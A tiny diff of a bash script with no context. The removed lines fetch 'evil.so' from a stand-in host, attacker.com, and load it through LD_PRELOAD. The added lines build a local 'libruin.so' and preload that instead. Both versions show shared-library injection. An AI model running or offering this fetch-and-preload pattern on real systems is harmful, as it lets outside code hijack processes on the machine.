@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ http://attacker.com/evil.so
-export LD_PRELOAD=/tmp/evil.so
+gcc *.o -fPIC -shared -o libruin.so
+LD_PRELOAD=$PWD/libruin.so
